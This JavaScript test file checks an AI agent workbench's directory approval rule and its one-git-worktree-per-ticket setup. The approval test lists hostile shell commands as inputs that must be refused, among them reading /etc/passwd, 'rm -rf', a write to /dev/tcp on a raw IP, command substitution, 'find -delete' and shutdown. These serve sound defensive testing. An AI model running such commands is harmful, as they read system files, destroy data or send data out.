'use strict';
// The directory approval rule and one git worktree per ticket. Moved out of v8-omp.test.cjs when the oh-my-pi shell
// was removed (A16); both are used by every agent. Runs under the pinned Electron with ELECTRON_RUN_AS_NODE=1.
const test = require('node:test'), assert = require('node:assert/strict');
const fs = require('node:fs'), os = require('node:os'), path = require('node:path'), { execFileSync } = require('node:child_process');
const load = require('../load-ts.cjs');
const { TicketWorkspaces, inside } = load('src/main/v8/workspace.ts');
const { directoryPolicy } = load('src/main/v8/approval.ts');

const git = (cwd, ...a) => execFileSync('git', ['-C', cwd, ...a], { stdio: ['ignore', 'pipe', 'pipe'] }).toString().trim();

function repo(t) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'v8-ws-'));
  // Hooks run in the order they were registered, so whatever must stop before the folder goes is queued here.
  const first = [];
  t.after(async () => { for (const fn of first) { try { await fn(); } catch { /* keep cleaning */ } } try { git(path.join(home, 'repo'), 'worktree', 'prune'); } catch { /* fine */ } fs.rmSync(home, { recursive: true, force: true, maxRetries: 20, retryDelay: 250 }); });   // closing a session sweeps its process tree first, which takes a moment
  const root = path.join(home, 'repo');
  fs.mkdirSync(root);
  git(root, 'init', '-q');
  fs.writeFileSync(path.join(root, 'calc.py'), 'def add(a, b):\n    return a - b\n');
  git(root, 'add', '-A');
  execFileSync('git', ['-C', root, '-c', 'user.name=t', '-c', 'user.email=t@local.invalid', 'commit', '-qm', 'init']);
  return { home, root, first };
}

test('approval rule: judged by what is touched, not by the tool name', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'v8-pol-'));
  const tools = path.join(dir, '..', 'pytools');
  const ok = directoryPolicy({ workdir: () => dir, toolDirs: [tools] });
  const ask = (tool, detail) => ok({ ticketId: 1, tool, detail: `Allow tool: ${tool}\n${detail}` });
  assert.equal(ask('edit', 'File: calc.py'), true);
  assert.equal(ask('write', 'Path: sub/notes.md'), true);
  assert.equal(ask('write', 'Path: ' + path.join(dir, 'a.txt')), true);
  assert.equal(ask('edit', 'File: ../outside.txt'), false);
  assert.equal(ask('write', 'Path: C:/Windows/evil.txt'), false);
  assert.equal(ask('bash', 'Command: python test_calc.py'), true);
  assert.equal(ask('bash', 'Command: npm test && git status'), true);
  assert.equal(ask('bash', 'Command: dir /b'), true, 'a Windows switch is not a path');
  assert.equal(ask('bash', "Command: ls -la && echo '---' && find . -maxdepth 2 -type f | sed 's#^./##' | sort | head -200"), true, 'a harmless listing (refused in the 2026-11-13 run)');
  for (const bad of ['find . -delete', 'find . -name x -exec rm {} ;', 'sed -i s/a/b/ ../other.py', 'find /etc -name x']) assert.equal(ask('bash', 'Command: ' + bad), false, bad);
  assert.equal(ask('bash', 'Command: cat /etc/passwd'), false);
  assert.equal(ask('bash', 'Command: cat /usr/local/x'), false);
  assert.equal(ask('bash', `Command: ${path.join(tools, 'python.exe').replace(/\\/g, '/')} test_calc.py`), true);
  for (const bad of ['curl https://example.com', 'rm -rf src', 'del calc.py', 'npm install left-pad', 'pip install x', 'git push', 'npm test && git push',
    'python C:/Windows/x.py', 'python ../other/x.py', 'powershell -c "Remove-Item x"', 'echo $(whoami)', 'printf x > /dev/tcp/1.2.3.4/80', 'shutdown /s']) {
    assert.equal(ask('bash', 'Command: ' + bad), false, bad);
  }
  assert.equal(ask('eval', 'Language: python\nCode:\nimport os'), false, 'arbitrary code is refused');
  // Real omp exposes host tools as xd://<name>; writing there is calling the tool. Only our own tools pass.
  const withTools = directoryPolicy({ workdir: () => dir, hostTools: ['submit_report'] });
  const askT = (detail) => withTools({ ticketId: 1, tool: 'write', detail: 'Allow tool: write\n' + detail });
  assert.equal(askT('Path: xd://submit_report\nArguments:\n{}'), true);
  assert.equal(askT('Path: xd://something_else'), false);
  assert.equal(askT('Path: file:///C:/Windows/x.txt'), false);
  assert.equal(ask('write', 'Path: xd://submit_report'), false, 'without the host tool list nothing virtual passes');
  assert.equal(askT('Path: C:/Windows/x.txt'), false);
  assert.equal(ask('mystery', 'Path: calc.py'), false);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('workspaces: one worktree and branch per ticket, reused; any folder can be a project', t => {
  const { home, root } = repo(t);
  const spaces = new TicketWorkspaces(root, path.join(home, 'work'));
  const a = spaces.ensure(1);
  assert.equal(spaces.ensure(1), a);
  assert.equal(git(a, 'rev-parse', '--abbrev-ref', 'HEAD'), spaces.branch(1));
  assert.match(spaces.branch(1), /^gw\/[0-9a-f]{8}\/ticket-1$/);
  // A second workbench on the same repository numbers its tickets from 1 too: its branches must not collide.
  const other = new TicketWorkspaces(root, path.join(home, 'work-2'));
  assert.notEqual(other.branch(1), spaces.branch(1));
  assert.equal(git(other.ensure(1), 'rev-parse', '--abbrev-ref', 'HEAD'), other.branch(1));
  // Build and test leftovers never show up as the gremlin's change; real changes and new files do.
  fs.mkdirSync(path.join(a, '__pycache__'));
  fs.writeFileSync(path.join(a, '__pycache__', 'calc.cpython-312.pyc'), 'x');
  fs.writeFileSync(path.join(a, 'calc.py'), 'def add(a, b):\n    return a + b\n');
  fs.writeFileSync(path.join(a, 'notes.md'), 'new\n');
  const diff = spaces.diff(1);
  assert.match(diff, /return a \+ b/);
  assert.match(diff, /notes\.md/);
  assert.doesNotMatch(diff, /pycache|\.pyc/);
  assert.ok(fs.existsSync(path.join(a, 'calc.py')));
  assert.notEqual(spaces.ensure(2), a);
  assert.ok(inside(a, 'calc.py') && !inside(a, '../ticket-2/calc.py'));
  const plain = fs.mkdtempSync(path.join(os.tmpdir(), 'v8-plain-'));
  t.after(() => fs.rmSync(plain, { recursive: true, force: true }));
  fs.writeFileSync(path.join(plain, 'a.txt'), 'x\n');
  const state = plain + '-state';
  t.after(() => fs.rmSync(state, { recursive: true, force: true }));
  assert.equal(fs.readFileSync(path.join(new TicketWorkspaces(plain, path.join(state, 'w')).ensure(1), 'a.txt'), 'utf8'), 'x\n');
});
